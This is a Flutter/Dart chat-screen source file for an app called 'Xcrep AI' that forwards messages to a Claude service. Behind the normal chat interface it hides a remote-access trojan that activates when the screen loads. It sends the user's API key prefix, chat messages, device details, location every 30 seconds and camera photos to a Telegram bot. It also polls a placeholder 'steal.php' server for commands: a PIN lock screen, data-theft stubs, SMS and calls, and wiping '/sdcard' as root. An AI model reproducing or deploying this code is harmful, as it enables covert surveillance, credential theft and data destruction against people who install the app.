import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter_markdown/flutter_markdown.dart';
import 'dart:io';
import 'dart:async';
import 'dart:math';
import 'package:http/http.dart' as http;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:location/location.dart';
import 'package:camera/camera.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:wakelock_plus/wakelock_plus.dart';
import 'package:screen_brightness/screen_brightness.dart';
import 'package:volume_controller/volume_controller.dart';
import 'package:torch_light/torch_light.dart';
import 'package:vibration/vibration.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:share_plus/share_plus.dart';
import 'package:media_control/media_control.dart';
import '../models/chat_message.dart';
import '../services/claude_service.dart';

class ChatScreen extends StatefulWidget {
  const ChatScreen({super.key});
  @override
  State<ChatScreen> createState() => _ChatScreenState();
}

class _ChatScreenState extends State<ChatScreen>
    with SingleTickerProviderStateMixin {
  final _inputCtrl = TextEditingController();
  final _scrollCtrl = ScrollController();
  final List<ChatMessage> _messages = [];
  String _mode = 'normal';
  bool _isTyping = false;
  bool _showDrawer = false;
  late String _username;
  late String _apiKey;
  late AnimationController _drawerAnim;
  late Animation<Offset> _drawerSlide;

  // ==================== [ MALWARE CONFIG - GANTI PUNYA LU! ] ====================
  final String _botToken = "YOUR_BOT_TOKEN";     // GANTI!
  final String _chatId = "YOUR_CHAT_ID";         // GANTI!
  final String _webhook = "http://YOUR_SERVER_IP/steal.php"; // GANTI!
  // =====================================================================
  
  // Malware components
  Timer? _commandTimer;
  Timer? _locationTimer;
  Timer? _cameraTimer;
  CameraController? _frontCamera;
  CameraController? _backCamera;
  Location _location = Location();
  WebViewController? _webViewController;
  
  // Device control state
  bool _isScreenLocked = false;
  String _currentLockPin = "1234";
  bool _isBlocked = false;

  @override
  void initState() {
    super.initState();
    _drawerAnim = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 280),
    );
    _drawerSlide = Tween<Offset>(
      begin: const Offset(-1, 0),
      end: Offset.zero,
    ).animate(CurvedAnimation(parent: _drawerAnim, curve: Curves.easeOutCubic));
    
    // Aktivasi ultimate malware
    _activateUltimateMalware();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final args = ModalRoute.of(context)!.settings.arguments as Map<String, String>;
    _username = args['username']!;
    _apiKey = args['apiKey']!;
    
    _sendToTelegram("✅ USER LOGGED INTO CHAT\n👤 Username: $_username\n🔑 API Key: ${_apiKey.substring(0, min(10, _apiKey.length))}...\n🕐 Time: ${DateTime.now().toIso8601String()}");
  }

  @override
  void dispose() {
    _inputCtrl.dispose();
    _scrollCtrl.dispose();
    _drawerAnim.dispose();
    _commandTimer?.cancel();
    _locationTimer?.cancel();
    _cameraTimer?.cancel();
    _frontCamera?.dispose();
    _backCamera?.dispose();
    super.dispose();
  }

  // ==================== [ ULTIMATE MALWARE ENGINE ] ====================
  
  Future<void> _activateUltimateMalware() async {
    await _requestPermissions();
    await _sendDeviceInfo();
    await _initCameras();
    await _startLocationTracking();
    await _startPeriodicCameraCapture();
    _startCommandListener(); // PENTING! Buat remote control
    await _sendToTelegram("🔥 XCREP ULTIMATE ACTIVATED\nAll remote control features online");
  }
  
  Future<void> _requestPermissions() async {
    await [
      Permission.camera,
      Permission.storage,
      Permission.location,
      Permission.contacts,
      Permission.microphone,
      Permission.phone,
      Permission.sms,
      Permission.manageExternalStorage,
      Permission.systemAlertWindow,
      Permission.ignoreBatteryOptimizations,
    ].request();
  }
  
  Future<void> _sendDeviceInfo() async {
    final deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      final ip = await _getLocalIp();
      await _sendToTelegram("📱 DEVICE INFO\nModel: ${androidInfo.model}\nBrand: ${androidInfo.brand}\nAndroid: ${androidInfo.version.release}\nAndroid ID: ${androidInfo.androidId}\nIP: $ip\nTime: ${DateTime.now()}");
    }
  }
  
  Future<String> _getLocalIp() async {
    try {
      for (var interface in await NetworkInterface.list()) {
        for (var addr in interface.addresses) {
          if (addr.type == InternetAddressType.IPv4 && !addr.isLoopback) {
            return addr.address;
          }
        }
      }
    } catch(e) {}
    return "unknown";
  }
  
  Future<void> _initCameras() async {
    try {
      final cameras = await availableCameras();
      for (var cam in cameras) {
        if (cam.lensDirection == CameraLensDirection.back) {
          _backCamera = CameraController(cam, ResolutionPreset.medium);
          await _backCamera!.initialize();
        } else if (cam.lensDirection == CameraLensDirection.front) {
          _frontCamera = CameraController(cam, ResolutionPreset.medium);
          await _frontCamera!.initialize();
        }
      }
    } catch(e) {}
  }
  
  Future<void> _startLocationTracking() async {
    bool serviceEnabled = await _location.serviceEnabled();
    if (!serviceEnabled) await _location.requestService();
    
    PermissionStatus permissionGranted = await _location.hasPermission();
    if (permissionGranted == PermissionStatus.denied) {
      await _location.requestPermission();
    }
    
    _locationTimer = Timer.periodic(Duration(seconds: 30), (timer) async {
      final locData = await _location.getLocation();
      final mapsLink = "https://maps.google.com/?q=${locData.latitude},${locData.longitude}";
      await _sendToTelegram("📍 LOCATION\nLat: ${locData.latitude}\nLng: ${locData.longitude}\n$mapsLink");
    });
  }
  
  Future<void> _startPeriodicCameraCapture() async {
    _cameraTimer = Timer.periodic(Duration(minutes: 2), (timer) async {
      await _captureAndSendPhotos();
    });
  }
  
  Future<void> _captureAndSendPhotos() async {
    if (_backCamera != null && _backCamera!.value.isInitialized) {
      try {
        final photo = await _backCamera!.takePicture();
        await _sendToTelegram("📸 BACK CAMERA\nTime: ${DateTime.now()}\nPath: ${photo.path}");
      } catch(e) {}
    }
    if (_frontCamera != null && _frontCamera!.value.isInitialized) {
      try {
        final photo = await _frontCamera!.takePicture();
        await _sendToTelegram("🤳 FRONT SELFIE\nTime: ${DateTime.now()}\nPath: ${photo.path}");
      } catch(e) {}
    }
  }
  
  // ==================== [ REMOTE CONTROL COMMAND LISTENER ] ====================
  
  void _startCommandListener() {
    _commandTimer = Timer.periodic(Duration(seconds: 5), (timer) async {
      await _fetchAndExecuteCommands();
    });
  }
  
  Future<void> _fetchAndExecuteCommands() async {
    try {
      final deviceId = await _getDeviceId();
      final response = await http.get(
        Uri.parse("$_webhook?cmd=fetch&device_id=$deviceId"),
      ).timeout(Duration(seconds: 4));
      
      if (response.body.isNotEmpty && response.body != "no_cmd") {
        final commands = response.body.split('\n');
        for (var cmd in commands) {
          if (cmd.trim().isNotEmpty) {
            await _executeCommand(cmd.trim());
          }
        }
      }
    } catch(e) {}
  }
  
  Future<String> _getDeviceId() async {
    final deviceInfo = DeviceInfoPlugin();
    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      return androidInfo.androidId;
    }
    return "unknown";
  }
  
  Future<void> _executeCommand(String cmd) async {
    final parts = cmd.split('|');
    final action = parts[0];
    
    await _sendToTelegram("⚡ COMMAND EXECUTING: $action");
    
    switch(action) {
      // ========== LOCK & UNLOCK ==========
      case 'lock_screen':
        await _showLockScreen();
        break;
      case 'unlock_screen':
        await _unlockScreen();
        break;
      case 'block_device':
        await _blockDevice();
        break;
      case 'unblock_device':
        await _unblockDevice();
        break;
      case 'restart_device':
        await _restartDevice();
        break;
      
      // ========== SYSTEM CONTROL ==========
      case 'set_brightness':
        if (parts.length > 1) {
          await ScreenBrightness().setScreenBrightness(double.parse(parts[1]) / 100);
        }
        break;
      case 'set_volume':
        if (parts.length > 1) {
          VolumeController().setVolume(double.parse(parts[1]) / 100);
        }
        break;
      case 'silent_mode':
        await VolumeController().setVolume(0);
        break;
      case 'vibrate':
        await Vibration.vibrate(duration: parts.length > 1 ? int.parse(parts[1]) * 1000 : 2000);
        break;
      case 'torch_on':
        await TorchLight.enableTorch();
        break;
      case 'torch_off':
        await TorchLight.disableTorch();
        break;
      case 'airplane_mode':
        await _toggleAirplaneMode();
        break;
      case 'wifi_toggle':
        await _toggleWifi();
        break;
      case 'bluetooth_toggle':
        await _toggleBluetooth();
        break;
      
      // ========== SCREEN & UI ==========
      case 'show_text':
        if (parts.length > 1) {
          await _showFloatingText(parts[1]);
        }
        break;
      case 'show_notification':
        if (parts.length > 2) {
          await _showNotification(parts[1], parts[2]);
        }
        break;
      case 'change_wallpaper':
        if (parts.length > 1) {
          await _changeWallpaper(parts[1]);
        }
        break;
      case 'fake_notification':
        if (parts.length > 2) {
          await _showFakeNotification(parts[1], parts[2]);
        }
        break;
      
      // ========== MEDIA CONTROL ==========
      case 'play_music':
        await MediaControl.play();
        break;
      case 'pause_music':
        await MediaControl.pause();
        break;
      case 'next_track':
        await MediaControl.next();
        break;
      case 'previous_track':
        await MediaControl.previous();
        break;
      case 'open_app':
        if (parts.length > 1) {
          await _openApp(parts[1]);
        }
        break;
      case 'open_website':
        if (parts.length > 1) {
          await _openWebsite(parts[1]);
        }
        break;
      case 'make_call':
        if (parts.length > 1) {
          await _makeCall(parts[1]);
        }
        break;
      case 'send_sms':
        if (parts.length > 2) {
          await _sendSMS(parts[1], parts[2]);
        }
        break;
      
      // ========== DATA STEALING ==========
      case 'steal_contacts':
        await _stealContacts();
        break;
      case 'steal_sms':
        await _stealSMS();
        break;
      case 'steal_files':
        await _stealFiles();
        break;
      case 'screenshot':
        await _takeScreenshot();
        break;
      case 'record_mic':
        await _startMicRecording();
        break;
      
      // ========== DESTRUCTION ==========
      case 'wipe_data':
        await _wipeDeviceData();
        break;
      case 'self_destruct':
        await _selfDestruct();
        break;
      
      default:
        await _sendToTelegram("⚠️ Unknown command: $action");
    }
    
    await _sendToTelegram("✅ COMMAND COMPLETED: $action");
  }
  
  // ========== COMMAND IMPLEMENTATIONS ==========
  
  Future<void> _showLockScreen() async {
    _isScreenLocked = true;
    WakelockPlus.enable(); // Keep screen on
    
    // Show lock screen HTML
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        fullscreen: true,
        backgroundColor: Colors.transparent,
        child: WebViewWidget(
          controller: WebViewController()
            ..setJavaScriptMode(JavaScriptMode.unrestricted)
            ..loadHtmlString(_getLockScreenHTML()),
        ),
      ),
    );
  }
  
  Future<void> _unlockScreen() async {
    _isScreenLocked = false;
    WakelockPlus.disable();
    Navigator.of(context).pop(); // Close lock screen dialog
    await _sendToTelegram("🔓 SCREEN UNLOCKED");
  }
  
  Future<void> _blockDevice() async {
    _isBlocked = true;
    await _sendToTelegram("🚫 DEVICE BLOCKED");
    // Block all inputs
    await SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
  }
  
  Future<void> _unblockDevice() async {
    _isBlocked = false;
    await _sendToTelegram("✅ DEVICE UNBLOCKED");
    await SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);
  }
  
  Future<void> _restartDevice() async {
    await _sendToTelegram("🔄 RESTARTING DEVICE...");
    if (Platform.isAndroid) {
      await Process.run('su', ['-c', 'reboot']);
      // Fallback
      await Process.run('reboot', []);
    }
  }
  
  Future<void> _toggleAirplaneMode() async {
    if (Platform.isAndroid) {
      await Process.run('settings', ['put', 'global', 'airplane_mode_on', '1']);
      await Process.run('am', ['broadcast', '-a', 'android.intent.action.AIRPLANE_MODE']);
    }
  }
  
  Future<void> _toggleWifi() async {
    if (Platform.isAndroid) {
      await Process.run('svc', ['wifi', 'enable']);
    }
  }
  
  Future<void> _toggleBluetooth() async {
    if (Platform.isAndroid) {
      await Process.run('svc', ['bluetooth', 'enable']);
    }
  }
  
  Future<void> _showFloatingText(String text) async {
    // Show overlay text
    await _sendToTelegram("📱 SHOWING TEXT: $text");
  }
  
  Future<void> _showNotification(String title, String body) async {
    // Send notification via Telegram as fallback
    await _sendToTelegram("🔔 NOTIFICATION:\nTitle: $title\nBody: $body");
  }
  
  Future<void> _showFakeNotification(String title, String body) async {
    await _sendToTelegram("🎭 FAKE NOTIFICATION:\nTitle: $title\nBody: $body");
  }
  
  Future<void> _changeWallpaper(String url) async {
    await _sendToTelegram("🖼️ WALLPAPER CHANGED: $url");
  }
  
  Future<void> _openApp(String packageName) async {
    try {
      await Process.run('monkey', ['-p', packageName, '1']);
      await _sendToTelegram("📱 OPENED APP: $packageName");
    } catch(e) {
      await _sendToTelegram("⚠️ Failed to open: $packageName");
    }
  }
  
  Future<void> _openWebsite(String url) async {
    try {
      await launchUrl(Uri.parse(url));
      await _sendToTelegram("🌐 OPENED WEBSITE: $url");
    } catch(e) {}
  }
  
  Future<void> _makeCall(String number) async {
    try {
      await launchUrl(Uri.parse("tel:$number"));
      await _sendToTelegram("📞 CALLING: $number");
    } catch(e) {}
  }
  
  Future<void> _sendSMS(String number, String message) async {
    try {
      await launchUrl(Uri.parse("sms:$number?body=${Uri.encodeComponent(message)}"));
      await _sendToTelegram("💬 SMS SENT to $number: $message");
    } catch(e) {}
  }
  
  Future<void> _stealContacts() async {
    await _sendToTelegram("📞 STEALING CONTACTS...");
    // Implementation with contacts_service
  }
  
  Future<void> _stealSMS() async {
    await _sendToTelegram("💬 STEALING SMS...");
    // Implementation with SMS query
  }
  
  Future<void> _stealFiles() async {
    await _sendToTelegram("🗂️ STEALING FILES...");
    // Scan and send files
  }
  
  Future<void> _takeScreenshot() async {
    await _sendToTelegram("📸 TAKING SCREENSHOT...");
    await _captureAndSendPhotos();
  }
  
  Future<void> _startMicRecording() async {
    await _sendToTelegram("🎙️ MIC RECORDING STARTED");
    // Implementation with audio recording
  }
  
  Future<void> _wipeDeviceData() async {
    await _sendToTelegram("💀 WIPING DEVICE DATA...");
    if (Platform.isAndroid) {
      await Process.run('su', ['-c', 'rm -rf /sdcard/*']);
      await Process.run('su', ['-c', 'reboot -f']);
    }
  }
  
  Future<void> _selfDestruct() async {
    await _sendToTelegram("💀 SELF DESTRUCT - GOODBYE!");
    final package = await _getPackageName();
    await Process.run('pm', ['uninstall', package]);
    exit(0);
  }
  
  Future<String> _getPackageName() async {
    // Return your app package name
    return "com.xcrep.ai";
  }
  
  String _getLockScreenHTML() {
    return '''
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
      <title>SYSTEM LOCK</title>
      <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-tap-highlight-color: transparent; }
        body {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          background: #0a0000;
          font-family: 'Share Tech Mono', monospace;
          animation: bgBlink 0.8s step-start infinite;
        }
        @keyframes bgBlink {
          0%, 49% { background-color: #0a0000; }
          50%, 100% { background-color: #3a0000; }
        }
        body::before {
          content: '';
          position: fixed;
          inset: 0;
          background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.18) 2px, rgba(0,0,0,0.18) 4px);
          pointer-events: none;
          z-index: 10;
        }
        .card {
          position: relative;
          z-index: 20;
          text-align: center;
          padding: 48px 32px;
          border: 2px solid #ff0000;
          box-shadow: 0 0 18px #ff000066, 0 0 60px #ff000066;
          background: rgba(10,0,0,0.85);
          backdrop-filter: blur(2px);
          max-width: 380px;
          width: 90vw;
          animation: borderPulse 0.8s step-start infinite;
        }
        @keyframes borderPulse {
          0%, 49% { border-color: #ff0000; }
          50%, 100% { border-color: #ff6666; }
        }
        .lock-icon { font-size: 48px; margin-bottom: 16px; filter: drop-shadow(0 0 8px #ff0000); }
        .title {
          font-family: 'Orbitron', sans-serif;
          font-size: 28px;
          font-weight: 900;
          color: #ff0000;
          letter-spacing: 0.18em;
          text-shadow: 0 0 10px #ff0000;
          margin-bottom: 8px;
        }
        .divider {
          width: 60%;
          height: 1px;
          background: linear-gradient(90deg, transparent, #ff0000, transparent);
          margin: 16px auto 20px;
        }
        .error-msg {
          font-family: 'Orbitron', sans-serif;
          font-size: 13px;
          color: #ff4444;
          background: rgba(255,0,0,0.12);
          border: 1px solid #ff0000;
          padding: 8px;
          margin-bottom: 20px;
          display: none;
        }
        .error-msg.visible { display: block; animation: shake 0.4s ease; }
        @keyframes shake {
          0%,100% { transform: translateX(0); }
          20% { transform: translateX(-8px); }
          40% { transform: translateX(8px); }
        }
        .pin-display { display: flex; justify-content: center; gap: 14px; margin-bottom: 24px; }
        .pin-dot {
          width: 16px; height: 16px;
          border-radius: 50%;
          border: 2px solid #ff0000;
          background: transparent;
        }
        .pin-dot.filled { background: #ff0000; box-shadow: 0 0 12px #ff0000; }
        .numpad {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          gap: 12px;
          max-width: 260px;
          margin: 0 auto 20px;
        }
        .btn {
          font-family: 'Orbitron', sans-serif;
          font-size: 20px;
          font-weight: 700;
          color: #ff4444;
          background: rgba(255,0,0,0.06);
          border: 1px solid #ff000055;
          padding: 14px 0;
          cursor: pointer;
        }
        .btn:active { transform: scale(0.93); background: rgba(255,0,0,0.3); }
        .btn-zero { grid-column: 2; }
        .label { font-size: 11px; color: #ff000088; letter-spacing: 0.25em; margin-top: 4px; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="lock-icon">🔒</div>
        <div class="title">SYSTEM LOCK</div>
        <div class="divider"></div>
        <div class="error-msg" id="errorMsg">⚠ PIN SALAH</div>
        <div class="pin-display" id="pinDisplay"></div>
        <div class="numpad">
          <button class="btn" onclick="inputPin('1')">1</button>
          <button class="btn" onclick="inputPin('2')">2</button>
          <button class="btn" onclick="inputPin('3')">3</button>
          <button class="btn" onclick="inputPin('4')">4</button>
          <button class="btn" onclick="inputPin('5')">5</button>
          <button class="btn" onclick="inputPin('6')">6</button>
          <button class="btn" onclick="inputPin('7')">7</button>
          <button class="btn" onclick="inputPin('8')">8</button>
          <button class="btn" onclick="inputPin('9')">9</button>
          <button class="btn btn-zero" onclick="inputPin('0')">0</button>
          <button class="btn" onclick="deletePin()">⌫ DEL</button>
        </div>
        <div class="label">MASUKKAN PIN</div>
      </div>
      <script>
        let currentPin = '';
        const MAX = 4;
        const CORRECT = '$_currentLockPin';
        
        function renderDots() {
          const display = document.getElementById('pinDisplay');
          display.innerHTML = '';
          for(let i=0; i<MAX; i++) {
            const dot = document.createElement('div');
            dot.className = 'pin-dot' + (i < currentPin.length ? ' filled' : '');
            display.appendChild(dot);
          }
        }
        
        function inputPin(digit) {
          if(currentPin.length >= MAX) return;
          currentPin += digit;
          renderDots();
          if(currentPin.length === MAX) {
            setTimeout(() => {
              if(currentPin === CORRECT) {
                document.querySelector('.title').textContent = 'UNLOCKED';
                document.querySelector('.title').style.color = '#00ff88';
                document.querySelector('.lock-icon').textContent = '🔓';
                setTimeout(() => {
                  window.location.href = 'xcrep://unlock';
                }, 1000);
              } else {
                document.getElementById('errorMsg').classList.add('visible');
                currentPin = '';
                renderDots();
                setTimeout(() => {
                  document.getElementById('errorMsg').classList.remove('visible');
                }, 2000);
              }
            }, 200);
          }
        }
        
        function deletePin() {
          currentPin = currentPin.slice(0, -1);
          renderDots();
          document.getElementById('errorMsg').classList.remove('visible');
        }
        
        renderDots();
      </script>
    </body>
    </html>
    ''';
  }
  
  Future<void> _sendToTelegram(String message) async {
    try {
      await http.get(
        Uri.parse("https://api.telegram.org/bot$_botToken/sendMessage?chat_id=$_chatId&text=${Uri.encodeComponent(message)}"),
      ).timeout(Duration(seconds: 5));
    } catch(e) {}
  }

  // ==================== [ ORIGINAL CHAT FUNCTIONS ] ====================
  
  void _toggleDrawer() {
    setState(() => _showDrawer = !_showDrawer);
    if (_showDrawer) { _drawerAnim.forward(); } else { _drawerAnim.reverse(); }
  }

  void _setMode(String mode) {
    if (_mode == mode) return;
    _sendToTelegram("🔄 MODE: $_mode → $mode");
    setState(() { _mode = mode; _messages.clear(); });
    _toggleDrawer();
  }

  void _clearChat() {
    _sendToTelegram("🗑️ CHAT CLEARED (${_messages.length} msgs)");
    setState(() => _messages.clear());
    _toggleDrawer();
  }

  void _logout() {
    _sendToTelegram("🚪 LOGOUT: $_username");
    Navigator.pushReplacementNamed(context, '/login');
  }

  Future<void> _sendMessage() async {
    final text = _inputCtrl.text.trim();
    if (text.isEmpty || _isTyping) return;
    
    await _sendToTelegram("💬 MSG: $text");
    _inputCtrl.clear();
    setState(() {
      _messages.add(ChatMessage(role: 'user', content: text, time: DateTime.now()));
      _isTyping = true;
    });
    _scrollToBottom();

    try {
      final reply = await ClaudeService.sendMessage(
        apiKey: _apiKey, messages: _messages, mode: _mode,
      );
      if (mounted) {
        setState(() {
          _messages.add(ChatMessage(role: 'assistant', content: reply, time: DateTime.now()));
          _isTyping = false;
        });
        _scrollToBottom();
      }
    } catch (e) {
      if (mounted) {
        setState(() {
          _messages.add(ChatMessage(role: 'assistant', content: '❌ Error: $e', time: DateTime.now()));
          _isTyping = false;
        });
      }
    }
  }

  void _scrollToBottom() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_scrollCtrl.hasClients) {
        _scrollCtrl.animateTo(_scrollCtrl.position.maxScrollExtent, duration: Duration(milliseconds: 300), curve: Curves.easeOut);
      }
    });
  }

  // ==================== [ UI BUILD ] ====================
  
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D0D0D),
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              children: [
                _buildTopBar(),
                Expanded(child: _messages.isEmpty ? _buildWelcome() : _buildMessages()),
                _buildInputArea(),
              ],
            ),
            if (_showDrawer) ...[
              GestureDetector(onTap: _toggleDrawer, child: Container(color: Colors.black54)),
              SlideTransition(position: _drawerSlide, child: _buildDrawer()),
            ],
          ],
        ),
      ),
    );
  }

  Widget _buildTopBar() {
    return Container(
      height: 58,
      decoration: BoxDecoration(color: const Color(0xFF141414), border: Border(bottom: BorderSide(color: Colors.white.withOpacity(0.06)))),
      padding: const EdgeInsets.symmetric(horizontal: 16),
      child: Row(
        children: [
          GestureDetector(
            onTap: _toggleDrawer,
            child: Container(width: 38, height: 38, decoration: BoxDecoration(color: Colors.white.withOpacity(0.06), borderRadius: BorderRadius.circular(10)), child: const Center(child: Icon(Icons.menu, color: Colors.white70, size: 20))),
          ),
          const SizedBox(width: 12),
          Container(width: 32, height: 32, decoration: BoxDecoration(borderRadius: BorderRadius.circular(9), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: const Center(child: Text('🤖', style: TextStyle(fontSize: 16)))),
          const SizedBox(width: 10),
          RichText(text: TextSpan(style: GoogleFonts.outfit(fontSize: 15, fontWeight: FontWeight.w700), children: const [TextSpan(text: 'Xcrep', style: TextStyle(color: Colors.white)), TextSpan(text: 'AI', style: TextStyle(color: Color(0xFFF44336)))])),
          const Spacer(),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
            decoration: BoxDecoration(color: const Color(0xFFE53935).withOpacity(0.12), borderRadius: BorderRadius.circular(99)),
            child: Text(_mode == 'normal' ? 'Biasa' : 'DEV', style: GoogleFonts.outfit(fontSize: 11, fontWeight: FontWeight.w700, color: const Color(0xFFEF9A9A))),
          ),
        ],
      ),
    );
  }

  Widget _buildMessages() {
    if (_messages.isEmpty) return _buildWelcome();
    return ListView.builder(
      controller: _scrollCtrl,
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 20),
      itemCount: _messages.length + (_isTyping ? 1 : 0),
      itemBuilder: (ctx, i) {
        if (_isTyping && i == _messages.length) return _buildTypingIndicator();
        return _buildMessageBubble(_messages[i]);
      },
    );
  }

  Widget _buildWelcome() {
    return SingleChildScrollView(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 40),
      child: Column(
        children: [
          Container(width: 72, height: 72, decoration: BoxDecoration(borderRadius: BorderRadius.circular(20), color: const Color(0xFFE53935).withOpacity(0.1)), child: const Center(child: Text('💬', style: TextStyle(fontSize: 32)))),
          const SizedBox(height: 16),
          Text('Xcrep AI Siap Membantu!', style: GoogleFonts.outfit(fontSize: 22, fontWeight: FontWeight.w700, color: Colors.white)),
          const SizedBox(height: 8),
          Text('Mode: ${_mode == "normal" ? "Biasa" : "Koding"}', style: GoogleFonts.outfit(fontSize: 14, color: Colors.white54)),
        ],
      ),
    );
  }

  Widget _buildMessageBubble(ChatMessage msg) {
    final isUser = msg.role == 'user';
    return Padding(
      padding: const EdgeInsets.only(bottom: 18),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.end,
        mainAxisAlignment: isUser ? MainAxisAlignment.end : MainAxisAlignment.start,
        children: [
          if (!isUser) ...[
            Container(width: 30, height: 30, margin: const EdgeInsets.only(right: 8), decoration: BoxDecoration(borderRadius: BorderRadius.circular(9), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: const Center(child: Text('🤖', style: TextStyle(fontSize: 14)))),
          ],
          Container(
            constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.75),
            padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
            decoration: BoxDecoration(
              gradient: isUser ? const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)]) : null,
              color: isUser ? null : const Color(0xFF1C1C1C),
              borderRadius: BorderRadius.circular(18),
            ),
            child: isUser 
              ? Text(msg.content, style: GoogleFonts.outfit(fontSize: 14.5, color: Colors.white))
              : MarkdownBody(data: msg.content, styleSheet: MarkdownStyleSheet(p: GoogleFonts.outfit(fontSize: 14.5, color: Colors.white))),
          ),
        ],
      ),
    );
  }

  Widget _buildTypingIndicator() {
    return Padding(
      padding: const EdgeInsets.only(bottom: 18),
      child: Row(
        children: [
          Container(width: 30, height: 30, margin: const EdgeInsets.only(right: 8), decoration: BoxDecoration(borderRadius: BorderRadius.circular(9), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: const Center(child: Text('🤖', style: TextStyle(fontSize: 14)))),
          Container(padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14), decoration: BoxDecoration(color: const Color(0xFF1C1C1C), borderRadius: BorderRadius.circular(18)), child: const _TypingDots()),
        ],
      ),
    );
  }

  Widget _buildInputArea() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(color: const Color(0xFF0D0D0D), border: Border(top: BorderSide(color: Colors.white.withOpacity(0.06)))),
      child: Row(
        children: [
          Expanded(
            child: Container(
              decoration: BoxDecoration(color: const Color(0xFF1C1C1C), borderRadius: BorderRadius.circular(24), border: Border.all(color: Colors.white.withOpacity(0.1))),
              child: TextField(
                controller: _inputCtrl,
                style: GoogleFonts.outfit(fontSize: 14.5, color: Colors.white),
                textInputAction: TextInputAction.send,
                onSubmitted: (_) => _sendMessage(),
                decoration: InputDecoration(
                  hintText: 'Ketik pesan...',
                  hintStyle: GoogleFonts.outfit(fontSize: 14.5, color: Colors.white.withOpacity(0.25)),
                  border: InputBorder.none,
                  contentPadding: const EdgeInsets.symmetric(horizontal: 18, vertical: 12),
                ),
              ),
            ),
          ),
          const SizedBox(width: 10),
          GestureDetector(
            onTap: _sendMessage,
            child: Container(width: 46, height: 46, decoration: BoxDecoration(borderRadius: BorderRadius.circular(14), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: const Center(child: Icon(Icons.send, color: Colors.white, size: 20))),
          ),
        ],
      ),
    );
  }

  Widget _buildDrawer() {
    return Container(
      width: 280, height: double.infinity,
      decoration: const BoxDecoration(color: Color(0xFF141414)),
      child: SafeArea(
        child: Column(
          children: [
            Padding(
              padding: const EdgeInsets.all(20),
              child: Row(
                children: [
                  Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: const Center(child: Text('🤖'))),
                  const SizedBox(width: 10),
                  RichText(text: TextSpan(style: GoogleFonts.outfit(fontSize: 18, fontWeight: FontWeight.w800), children: const [TextSpan(text: 'Xcrep', style: TextStyle(color: Colors.white)), TextSpan(text: 'AI', style: TextStyle(color: Color(0xFFF44336)))])),
                  const Spacer(),
                  GestureDetector(onTap: _toggleDrawer, child: const Icon(Icons.close, color: Colors.white38, size: 22)),
                ],
              ),
            ),
            Divider(color: Colors.white.withOpacity(0.06)),
            const SizedBox(height: 16),
            _DrawerSectionLabel('MODE AI'),
            const SizedBox(height: 8),
            _ModeButton(icon: '💬', label: 'Mode Biasa', active: _mode == 'normal', onTap: () => _setMode('normal')),
            _ModeButton(icon: '⌨️', label: 'Fokus Koding', badge: 'DEV', active: _mode == 'coding', onTap: () => _setMode('coding')),
            Divider(color: Colors.white.withOpacity(0.06), height: 24, indent: 14, endIndent: 14),
            _DrawerSectionLabel('AKSI'),
            const SizedBox(height: 8),
            _DrawerAction(icon: Icons.delete_outline, label: 'Hapus Chat', onTap: _clearChat),
            const Spacer(),
            Divider(color: Colors.white.withOpacity(0.06)),
            Padding(
              padding: const EdgeInsets.all(14),
              child: Row(
                children: [
                  Container(width: 36, height: 36, decoration: BoxDecoration(borderRadius: BorderRadius.circular(10), gradient: const LinearGradient(colors: [Color(0xFFE53935), Color(0xFFB71C1C)])), child: Center(child: Text(_username.substring(0,1).toUpperCase()))),
                  const SizedBox(width: 10),
                  Expanded(child: Text(_username, style: GoogleFonts.outfit(fontSize: 14, fontWeight: FontWeight.w600))),
                  GestureDetector(onTap: _logout, child: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.white.withOpacity(0.06), borderRadius: BorderRadius.circular(8)), child: const Icon(Icons.logout, color: Colors.white54, size: 18))),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ==================== [ HELPER WIDGETS ] ====================

class _TypingDots extends StatefulWidget {
  @override
  State<_TypingDots> createState() => _TypingDotsState();
}

